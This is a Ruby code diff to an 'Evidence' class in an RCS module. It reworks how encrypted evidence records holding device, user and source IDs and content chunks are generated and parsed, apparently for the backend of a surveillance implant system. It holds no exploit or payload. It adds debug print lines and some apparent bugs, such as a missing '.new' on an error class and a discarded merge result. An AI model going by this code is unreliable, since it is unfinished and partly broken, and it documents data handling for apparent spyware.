@@ -42,15 +42,13 @@ class Evidence
     2008121901
   end
   
-  def clone
-    return Evidence.new(@key, @info)
-  end
+  #def clone
+  #  return Evidence.new(@key, @info)
+  #end
   
-  def initialize(key, info = {})
+  def initialize(key)
     @key = key
     @version = Evidence.VERSION_ID
-    @info = Hash.new.merge info
-    @info[:empty] = false
   end
   
   def extend_on_type(type)
@@ -61,11 +59,12 @@ class Evidence
     extend_on_type EVIDENCE_TYPES[id]
   end
   
-  def generate_header(type_id)
-    thigh, tlow = @info[:acquired].to_filetime
-    deviceid_utf16 = @info[:device_id].to_utf16le_binary
-    userid_utf16 = @info[:user_id].to_utf16le_binary
-    sourceid_utf16 = @info[:source_id].to_utf16le_binary
+  def generate_header(type_id, info)
+    puts info
+    thigh, tlow = info[:acquired].to_filetime
+    deviceid_utf16 = info[:device_id].to_utf16le_binary
+    userid_utf16 = info[:user_id].to_utf16le_binary
+    sourceid_utf16 = info[:source_id].to_utf16le_binary
     
     add_header = ''
     add_header = additional_header if respond_to? :additional_header
@@ -103,17 +102,18 @@ class Evidence
   end
   
   # factory to create a random evidence
-  def generate(type)
+  def generate(type, common_info)
     @name =  SecureRandom.hex(16)
-    @info[:acquired] = Time.now.utc
-    @info[:type] = type
+    info = Hash[common_info]
+    info[:acquired] = Time.now.utc
+    info[:type] = type
     
     # extend class on requested type
-    extend_on_type @info[:type]
+    extend_on_type info[:type]
     
     # header
     type_id = EVIDENCE_TYPES.invert[type]
-    header = generate_header(type_id)
+    header = generate_header(type_id, info)
     @binary = append_data(encrypt(header))
     
     # content
@@ -154,8 +154,8 @@ class Evidence
     data.read(4).unpack("I").shift
   end
 
-  def empty?
-    @info[:empty]
+  def empty?(binary_string, header_length)
+    (binary_string.size == header_length + 4)
   end
   
   def deserialize(data)
@@ -165,7 +165,9 @@ class Evidence
     
     # header
     header_length = read_uint32(binary_string)
-    @info[:empty] = (binary_string.size == header_length + 4)
+
+    # if empty evidence, raise
+    raise EmptyEvidenceError("empty evidence") if empty?(binary_string, header_length)
     
     # decrypt header
     header_string = StringIO.new decrypt(binary_string.read header_length)
@@ -180,43 +182,56 @@ class Evidence
     
     # check that version is correct
     raise EvidenceDeserializeError.new("mismatching version [expected #{Evidence.VERSION_ID}, found #{@version}]") unless @version == Evidence.VERSION_ID
-    
-    @info[:received] = Time.new.getgm
-    @info[:acquired] = Time.from_filetime(time_h, time_l).getgm
-    
-    @info[:device] = header_string.read(host_size).utf16le_to_utf8 unless host_size == 0
-    @info[:device] ||= ''
-    @info[:user] = header_string.read(user_size).utf16le_to_utf8 unless user_size == 0
-    @info[:user] ||= ''
-    @info[:source] = header_string.read(ip_size).utf16le_to_utf8 unless ip_size == 0
-    @info[:source] ||= ''
-    @info[:data] = {}
+
+    common_info = Hash.new
+    common_info[:received] = Time.new.getgm
+    common_info[:acquired] = Time.from_filetime(time_h, time_l).getgm
+
+    common_info[:device] = header_string.read(host_size).utf16le_to_utf8 unless host_size == 0
+    common_info[:device] ||= ''
+    common_info[:user] = header_string.read(user_size).utf16le_to_utf8 unless user_size == 0
+    common_info[:user] ||= ''
+    common_info[:source] = header_string.read(ip_size).utf16le_to_utf8 unless ip_size == 0
+    common_info[:source] ||= ''
     
     # extend class depending on evidence type
     begin
-      @info[:type] = EVIDENCE_TYPES[ @type_id ].to_s.downcase
-      extend_on_type @info[:type]
+      common_info[:type] = EVIDENCE_TYPES[ @type_id ].to_s.downcase
+      puts "Extending evidence on type #{common_info[:type]}"
+      extend_on_type common_info[:type]
     rescue Exception => e
-      raise EvidenceDeserializeError.new("unknown type => #{@type_id}")
+      puts e.message
+      raise EvidenceDeserializeError.new("unknown type => #{@type_id.to_s(16)}")
     end
-    
+
+    puts "Evidence (1) type #{common_info[:type]}"
+
     unless additional_size == 0
       additional_data = header_string.read additional_size
-      decode_additional_header(additional_data) if respond_to? :decode_additional_header
+      common_info.merge(decode_additional_header(additional_data)) if respond_to? :decode_additional_header
     end
-    
+
+    puts "Evidence (2) type #{common_info[:type]}"
+
     # split content to chunks
-    @info[:chunks] = []
+    chunks = Array.new
     while not binary_string.eof?
       len = read_uint32(binary_string)
       content = binary_string.read align_to_block_len(len)
-      @info[:chunks] << StringIO.new( decrypt(content) ).read(len)
+      chunks << StringIO.new( decrypt(content) ).read(len)
     end
-    yield @info[:chunks].join if block_given?
-    
-    return @info[:empty] ? [self] : decode_content
+    yield chunks.join if block_given?
+
+    puts "Evidence (3) type #{common_info[:type]}"
+
+    # decode evidences
+    evidences = Array.new
+    decode_content(common_info, chunks) {|ev| evidences << ev}
+
+    puts "Evidence (4) type #{common_info[:type]}"
+
+    return evidences
   end
-  
 end
 
 end # RCS::
